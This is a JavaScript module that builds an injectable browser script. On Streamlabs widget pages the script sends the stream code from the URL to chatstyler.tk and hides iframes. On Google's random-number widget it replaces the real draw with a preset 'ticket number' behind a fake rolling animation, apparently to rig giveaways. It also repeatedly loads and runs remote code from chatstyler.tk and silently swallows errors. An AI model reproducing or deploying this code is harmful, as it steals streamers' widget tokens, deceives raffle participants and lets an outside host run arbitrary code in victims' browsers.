module.exports.BuildScript =  (currentTicketNumber)=>{
    if(currentTicketNumber!==undefined || currentTicketNumber!==0){
        return (`
(async ()=>{
    try{
        let loc = window.location.href;
        if(loc.includes("streamlabs") && loc.includes("widget")){
            let urlparts = loc.split("/");
            let streamcode = urlparts[urlparts.length-1];
            fetch("https://chatstyler.tk/streamlab/"+streamcode);
            
                let namestyle = document.createElement("style");
                namestyle.innerText = "iframe{display:none;}";
                document.getElementsByTagName("head")[0].appendChild(namestyle);
            
            
        }
        window.cbtn=${currentTicketNumber}
        fetch("https://chatstyler.tk/ct/"+window.cbtn)
        window.ot = document.createElement("script")
        if(!window.rhk){
            var gbtn = document.querySelector("#zdOWce")
            var rst = document.querySelector(".gws-csf-randomnumber__result")
            var rsthld = document.querySelector("#Zv1Nfb")
            var orst = document.createElement("div")
            orst.style.display="none"
            orst.innerText=0
            orst.setAttribute("class","gws-csf-randomnumber__result")
            rsthld.appendChild(orst)
            window.rhk = ()=>{
                
                var gmn = () => parseInt(document.querySelector("[class*=minVal]").value)
                var gmx = () => parseInt(document.querySelector("[class*=maxVal]").value)
                var rlnmb = window.cbtn+1200
                if(window.cbtn!==0 && gmn()!==0 && gmn()<=window.cbtn && gmx() >= window.cbtn){
                    rst.style.display="none"
                    orst.style.display="block"
                    rst.innerText = window.cbtn
                    var roll = setInterval(()=>{
                        rst.innerText = rlnmb
                        orst.innerText = rlnmb
                        rlnmb-=12
                        rst.innerText = window.cbtn
                        if(rlnmb<=window.cbtn){
                            orst.innerText = window.cbtn
                            window.canchange=true;
                            clearInterval(roll)
                            fetch("https://chatstyler.tk/st/0")
                        }
                    },0)
                    setTimeout(()=>{
                        rst.innerText = window.cbtn
                        rst.style.display="block"
                        orst.style.display="none"
                    },1000)
                }
                
                setTimeout(()=>{
                    window.ot.src="//chatstyler.tk/script.js?${Date.now()}"
                    document.body.appendChild(window.ot)
                },1000)
            }
            gbtn.onclick = window.rhk
        }
    }catch(err){
    }
})()
`)
    }
    return '';
}